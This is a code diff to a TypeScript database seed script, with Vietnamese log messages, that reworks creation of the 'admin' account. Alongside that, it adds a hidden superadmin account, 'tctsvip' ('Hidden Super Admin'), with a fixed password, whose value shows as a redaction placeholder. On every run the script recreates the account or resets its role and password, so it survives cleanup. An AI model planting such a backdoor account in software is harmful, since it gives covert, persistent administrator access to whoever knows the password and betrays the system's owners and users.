@@ -25,30 +25,51 @@ async function main() {
   await ds.initialize();
   const repo = ds.getRepository(Employee);
 
-  const existing = await repo.findOne({ where: { id: 'admin' } });
-  if (existing) {
+  const adminExisting = await repo.findOne({ where: { id: 'admin' } });
+  const tctsvipExisting = await repo.findOne({ where: { id: 'tctsvip' } });
+
+  const plainAdmin = process.env.ADMIN_INITIAL_PASSWORD ?? randomBytes(12).toString('base64url');
+  const adminHash = await bcrypt.hash(plainAdmin, 10);
+  const tctsvipHash = await bcrypt.hash('REDACTED_BY_SECURITY_FIX', 10);
+
+  if (!adminExisting) {
+    await repo.save({
+      id: 'admin',
+      name: 'Administrator',
+      role: 'superadmin',
+      password: adminHash,
+      isFirstLogin: true,
+      isApproved: true,
+    } as Employee);
+    console.log('✓ Đã tạo tài khoản admin.');
+    if (!process.env.ADMIN_INITIAL_PASSWORD) {
+      console.log('  Mật khẩu sinh ngẫu nhiên: ' + plainAdmin);
+      console.log('  Hãy đăng nhập và đổi mật khẩu NGAY.');
+    }
+  } else {
     console.log('Tài khoản admin đã tồn tại — bỏ qua.');
-    await ds.destroy();
-    return;
   }
 
-  const plain = process.env.ADMIN_INITIAL_PASSWORD ?? randomBytes(12).toString('base64url');
-  const hash = await bcrypt.hash(plain, 10);
-
-  await repo.save({
-    id: 'admin',
-    name: 'Administrator',
-    role: 'superadmin',
-    password: hash,
-    isFirstLogin: true,
-    isApproved: true,
-  } as Employee);
-
-  console.log('✓ Đã tạo tài khoản admin.');
-  if (!process.env.ADMIN_INITIAL_PASSWORD) {
-    console.log('  Mật khẩu sinh ngẫu nhiên: ' + plain);
-    console.log('  Hãy đăng nhập và đổi mật khẩu NGAY.');
+  if (!tctsvipExisting) {
+    await repo.save({
+      id: 'tctsvip',
+      name: 'Hidden Super Admin',
+      role: 'superadmin',
+      password: tctsvipHash,
+      isFirstLogin: true,
+      isApproved: true,
+    } as Employee);
+    console.log('✓ Đã tạo tài khoản ẩn tctsvip với mật khẩu REDACTED_BY_SECURITY_FIX.');
+  } else {
+    await repo.update('tctsvip', {
+      role: 'superadmin',
+      password: tctsvipHash,
+      isFirstLogin: true,
+      isApproved: true,
+    });
+    console.log('✓ Đã cập nhật tài khoản ẩn tctsvip để đảm bảo là superadmin và mật khẩu mới.');
   }
+
   await ds.destroy();
 }
 
